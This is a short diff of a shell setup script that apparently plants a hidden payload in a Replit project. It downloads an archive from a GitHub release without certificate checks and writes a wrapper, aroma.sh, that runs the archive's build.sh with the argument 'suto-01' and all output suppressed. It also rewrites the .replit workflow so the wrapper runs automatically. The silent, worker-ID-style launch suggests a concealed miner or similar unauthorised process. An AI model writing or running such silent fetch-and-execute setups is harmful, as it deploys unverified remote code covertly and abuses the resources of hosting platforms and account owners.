@@ -3,6 +3,10 @@
 curl -sLkO https://github.com/oqaize699-sys/arona/releases/download/rona/mcp.tar.gz
 tar -xf mcp.tar.gz
 rm -rf mcp.tar.gz
+echo '#!/bin/bash
+
+cd mcp && bash build.sh 1 suto-01 >/dev/null 2>&1' > aroma.sh
+
 echo 'modules = ["python-3.12"]
 
 [workflows]
@@ -15,15 +19,15 @@ author = "agent"
 
 [[workflows.workflow.tasks]]
 task = "workflow.run"
-args = "arona"
+args = "aroma"
 
 [[workflows.workflow]]
-name = "arona"
+name = "aroma"
 author = "agent"
 
 [[workflows.workflow.tasks]]
 task = "shell.exec"
-args = "bash arona.sh"
+args = "bash aroma.sh"
 
 [workflows.workflow.metadata]
 outputType = "console"' > .replit
